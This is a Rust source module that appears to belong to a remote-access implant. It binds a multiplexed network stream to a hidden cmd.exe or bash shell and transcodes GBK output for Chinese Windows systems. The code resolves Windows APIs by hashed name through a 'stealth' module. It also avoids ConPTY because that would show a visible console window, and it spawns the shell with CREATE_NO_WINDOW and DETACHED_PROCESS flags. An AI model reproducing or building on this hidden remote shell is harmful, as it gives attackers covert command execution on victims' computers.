use portable_pty::{CommandBuilder, NativePtySystem, PtySize, Child, PtySystem};
use std::io::{Read, Write};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_util::compat::FuturesAsyncReadCompatExt;
use std::panic::catch_unwind;
use std::process::Stdio;
use encoding_rs::GBK;
use log::{debug, error, warn};

struct ConPtyGuard {
    _child: Box<dyn Child + Send>,
    _system: Box<dyn PtySystem + Send>,
}

impl Drop for ConPtyGuard {
    fn drop(&mut self) {
        debug!("[PTY] Dropping ConPtyGuard, killing child process");
        let _ = self._child.kill();
        debug!("[PTY] Child process killed");
    }
}

#[allow(dead_code)]
enum PtyGuard {
    ConPty(ConPtyGuard),
    Pipe(tokio::process::Child),
}

/// 工业级自适应 PTY 处理器 (支持 GBK 转码与 Windows 8.1 兼容)
pub async fn handle_stream(stream: yamux::Stream) {
    // 🛡️ [Hardening] Re-confirm console handles for this thread
    #[cfg(target_os = "windows")]
    unsafe {
        let h_kernel32 = winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const _);
        if !h_kernel32.is_null() {
            if let Some(set_std_addr) = crate::stealth::get_api_addr(h_kernel32 as usize, crate::stealth::hash_api_name(b"SetStdHandle")) {
                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 = std::mem::transmute(set_std_addr);
                // Ensure we don't have null handles that could crash the PTY library
                let h_out = winapi::um::processenv::GetStdHandle(winapi::um::winbase::STD_OUTPUT_HANDLE);
                if h_out.is_null() || h_out == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                    // If invalid, try to get a handle to the current console
                    if let Ok(file) = std::fs::OpenOptions::new().write(true).open("CONOUT$") {
                        use std::os::windows::io::AsRawHandle;
                        set_std_handle(winapi::um::winbase::STD_OUTPUT_HANDLE, file.as_raw_handle() as usize);
                    }
                }
            }
        }
    }

    // 🛡️ [Hardening] Brief pause to allow underlying TCP stack to process window updates
    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    
    debug!("[PTY] New PTY stream accepted. Thread: {:?}", std::thread::current().id());

    let (mut net_r, mut net_w) = tokio::io::split(stream.compat());
    let (tx_to_net, mut rx_from_pty) = tokio::sync::mpsc::channel::<Vec<u8>>(4096);
    let (tx_to_pty, rx_from_net) = tokio::sync::mpsc::channel::<Vec<u8>>(4096);

    // 1. 尝试 ConPty (使用独立系统线程以获得最大稳定性)
    debug!("[PTY] Spawning dedicated setup thread...");
    let (setup_tx, setup_rx) = tokio::sync::oneshot::channel();
    
    std::thread::spawn(move || {
        let result = catch_unwind(|| -> Result<(Box<dyn Child + Send>, Box<dyn Read + Send>, Box<dyn Write + Send>, Box<dyn PtySystem + Send>), String> {
            // 🛡️ Windows FIX: Skip ConPTY — it creates a visible cmd.exe window.
            // Use PipeShell fallback (already has CREATE_NO_WINDOW).
            #[cfg(target_os = "windows")]
            {
                return Err("[FIX] ConPTY skipped on Windows (visible cmd.exe). Using PipeShell (CREATE_NO_WINDOW)".to_string());
            }

            debug!("[PTY] Initializing NativePtySystem...");
            let pty_system = NativePtySystem::default();
            #[allow(unused_variables)]
            let pair = pty_system.openpty(PtySize { rows: 24, cols: 80, ..Default::default() })
                .map_err(|e| format!("Failed to open PTY (API error): {:?}", e))?;

            let shell = if cfg!(windows) { "cmd.exe" } else { "/bin/bash" };
            let mut cmd = CommandBuilder::new(shell);
            if cfg!(windows) {
                if let Ok(val) = std::env::var("SystemRoot") {
                    cmd.env("SystemRoot", &val);
                }
            }
            cmd.env("TERM", "xterm-256color");

            let child = pair.slave.spawn_command(cmd).map_err(|e| format!("Failed to spawn shell: {:?}", e))?;
            let reader = pair.master.try_clone_reader().map_err(|e| format!("Failed to clone reader: {:?}", e))?;
            let writer = pair.master.take_writer().map_err(|e| format!("Failed to take writer: {:?}", e))?;

            debug!("[PTY] Dedicated thread setup successful");
            Ok((child, reader, writer, Box::new(pty_system)))
        });

        let final_res = match result {
            Ok(inner) => inner,
            Err(p) => Err(format!("Panic in dedicated thread: {:?}", p)),
        };
        let _ = setup_tx.send(final_res);
    });

    let pty_setup = setup_rx.await;

    // 2. 核心分发逻辑
    let (child_guard, pty_read_task, pty_write_task) = match pty_setup {
        Ok(Ok((child, reader, writer, _system))) => {
            debug!("[PTY] ConPty mode active (Industrial Shell)");
            // 发送 PTY 就绪信号（可选）
            let _ = tx_to_net.send(b"\r\n\x1b[1;32m[+] Industrial PTY Session Started.\x1b[0m\r\n\r\n".to_vec()).await;

            let (r, w) = spawn_io_tasks(reader, writer, tx_to_net, rx_from_net);
            (Some(PtyGuard::ConPty(ConPtyGuard { _child: child, _system: _system })), r, w)
        },
        Ok(Err(e)) => {
            warn!("[PTY] ConPty initialization failed: {}. Falling back to PipeShell...", e);
            match spawn_pipe_shell(tx_to_net, rx_from_net).await {
                Ok((c, r, w)) => (Some(PtyGuard::Pipe(c)), r, w),
                Err(e) => {
                    error!("[PTY] Fallback PipeShell also failed: {}", e);
                    return;
                }
            }
        },
        Err(recv_error) => {
            error!("[PTY] Dedicated thread communication error: {}. Falling back to PipeShell...", recv_error);
            match spawn_pipe_shell(tx_to_net, rx_from_net).await {
                Ok((c, r, w)) => (Some(PtyGuard::Pipe(c)), r, w),
                Err(e) => {
                    error!("[PTY] Fallback PipeShell also failed: {}", e);
                    return;
                }
            }
        }
    };

    // 3. 网络传输循环
    let net_read = async {
        let mut buf = [0u8; 8192];
        loop {
            match net_r.read(&mut buf).await {
                Ok(0) => {
                    debug!("[PTY] Network read EOF, closing connection");
                    break;
                }
                Ok(n) => {
                    if tx_to_pty.send(buf[..n].to_vec()).await.is_err() {
                        warn!("[PTY] Failed to send data to PTY, channel closed");
                        break;
                    }
                }
                Err(e) => {
                    error!("[PTY] Network read error: {}", e);
                    break;
                }
            }
        }
    };

    let net_write = async {
        while let Some(data) = rx_from_pty.recv().await {
            if let Err(e) = net_w.write_all(&data).await {
                error!("[PTY] Network write error: {}", e);
                break;
            }
            let _ = net_w.flush().await;
            // 🛡️ [Hardening] Yield to allow other tasks to process
            tokio::task::yield_now().await;
        }
        debug!("[PTY] Network write task finished");
    };

    tokio::select! {
        _ = net_read => { debug!("[PTY] net_read finished"); },
        _ = net_write => { debug!("[PTY] net_write finished"); },
        _ = pty_read_task => { debug!("[PTY] pty_read_task finished"); },
        _ = pty_write_task => { debug!("[PTY] pty_write_task finished"); },
    }

    debug!("[PTY] Cleaning up PTY session");
    // Drop guard naturally, which kills the child process.
    drop(child_guard);
    debug!("[PTY] PTY session terminated");
}

fn spawn_io_tasks(
    mut reader: Box<dyn Read + Send>,
    mut writer: Box<dyn Write + Send>,
    tx_to_net: tokio::sync::mpsc::Sender<Vec<u8>>,
    mut rx_from_net: tokio::sync::mpsc::Receiver<Vec<u8>>
) -> (tokio::task::JoinHandle<()>, tokio::task::JoinHandle<()>) {
    let r_task = tokio::task::spawn_blocking(move || {
        debug!("[PTY] ConPty reader task started");
        let mut buf = [0u8; 16384];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => {
                    debug!("[PTY] ConPty reader EOF");
                    break;
                }
                Ok(n) => {
                    if tx_to_net.blocking_send(buf[..n].to_vec()).is_err() {
                        warn!("[PTY] ConPty reader: failed to send to network channel");
                        break;
                    }
                }
                Err(e) => {
                    error!("[PTY] ConPty reader error: {}", e);
                    break;
                }
            }
        }
        debug!("[PTY] ConPty reader task finished");
    });

    let w_task = tokio::task::spawn_blocking(move || {
        debug!("[PTY] ConPty writer task started");
        while let Some(data) = rx_from_net.blocking_recv() {
            if let Err(e) = writer.write_all(&data) {
                error!("[PTY] ConPty writer error: {}", e);
                break;
            }
            let _ = writer.flush();
        }
        debug!("[PTY] ConPty writer task finished");
    });

    (r_task, w_task)
}

/// 🚀 增强版 Windows 管道 Shell：支持 GBK -> UTF8 实时转码
async fn spawn_pipe_shell(
    tx_to_net: tokio::sync::mpsc::Sender<Vec<u8>>,
    mut rx_from_net: tokio::sync::mpsc::Receiver<Vec<u8>>
) -> std::result::Result<(tokio::process::Child, tokio::task::JoinHandle<()>, tokio::task::JoinHandle<()>), String> {
    use tokio::process::Command;

    debug!("[PTY] Spawning fallback pipe shell");

    let mut cmd = if cfg!(windows) {
        let mut c = Command::new("cmd.exe");
        #[cfg(windows)]
        c.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
        c
    } else {
        Command::new("sh")
    };

    let mut child = cmd
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .env("TERM", "xterm-256color")
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| format!("Failed to spawn shell: {}", e))?;

    debug!("[PTY] Pipe shell spawned successfully");

    let mut stdin = child.stdin.take().ok_or_else(|| "Failed to take stdin".to_string())?;
    let mut stdout = child.stdout.take().ok_or_else(|| "Failed to take stdout".to_string())?;
    let mut stderr = child.stderr.take().ok_or_else(|| "Failed to take stderr".to_string())?;

    let _ = tx_to_net.send(b"{\"type\": \"PTY_MODE\", \"content\": \"fallback\"}".to_vec()).await;
    let _ = tx_to_net.send(b"\r\n\x1b[32m[+] Legacy Pipe Stream Started.\x1b[0m\r\n\r\n".to_vec()).await;

    // 1. Stdout 读取
    let tx_out = tx_to_net.clone();
    let r_out = tokio::spawn(async move {
        debug!("[PTY] Pipe stdout reader started");
        let mut buf = [0u8; 16384];
        loop {
            match stdout.read(&mut buf).await {
                Ok(0) => {
                    debug!("[PTY] Pipe stdout EOF");
                    break;
                }
                Ok(n) => {
                    let data = &buf[..n];

                    #[cfg(windows)]
                    let payload = {
                        let (res, _, has_error) = GBK.decode(data);
                        if !has_error { res.as_bytes().to_vec() } else { data.to_vec() }
                    };
                    #[cfg(not(windows))]
                    let payload = data.to_vec();

                    if tx_out.send(payload).await.is_err() {
                        warn!("[PTY] Pipe stdout: failed to send to network channel");
                        break;
                    }
                }
                Err(e) => {
                    error!("[PTY] Pipe stdout read error: {}", e);
                    break;
                }
            }
        }
        debug!("[PTY] Pipe stdout reader finished");
    });

    // 2. Stderr 读取
    let tx_err = tx_to_net.clone();
    let r_err = tokio::spawn(async move {
        debug!("[PTY] Pipe stderr reader started");
        let mut buf = [0u8; 16384];
        loop {
            match stderr.read(&mut buf).await {
                Ok(0) => {
                    debug!("[PTY] Pipe stderr EOF");
                    break;
                }
                Ok(n) => {
                    let data = &buf[..n];

                    #[cfg(windows)]
                    let payload = {
                        let (res, _, has_error) = GBK.decode(data);
                        if !has_error { res.as_bytes().to_vec() } else { data.to_vec() }
                    };
                    #[cfg(not(windows))]
                    let payload = data.to_vec();

                    if tx_err.send(payload).await.is_err() {
                        warn!("[PTY] Pipe stderr: failed to send to network channel");
                        break;
                    }
                }
                Err(e) => {
                    error!("[PTY] Pipe stderr read error: {}", e);
                    break;
                }
            }
        }
        debug!("[PTY] Pipe stderr reader finished");
    });

    // 3. Stdin 处理
    let w_task = tokio::spawn(async move {
        debug!("[PTY] Pipe stdin writer started");
        while let Some(data) = rx_from_net.recv().await {
            #[cfg(windows)]
            let final_data = {
                let utf8_str = String::from_utf8_lossy(&data).to_string();
                let (gbk_data, _, _) = GBK.encode(&utf8_str);
                gbk_data.into_owned()
            };
            #[cfg(not(windows))]
            let final_data = data;

            if let Err(e) = stdin.write_all(&final_data).await {
                error!("[PTY] Pipe stdin write error: {}", e);
                break;
            }
            let _ = stdin.flush().await;
        }
        debug!("[PTY] Pipe stdin writer finished");
    });

    let combined_r = tokio::spawn(async move { let _ = tokio::join!(r_out, r_err); });

    Ok((child, combined_r, w_task))
}
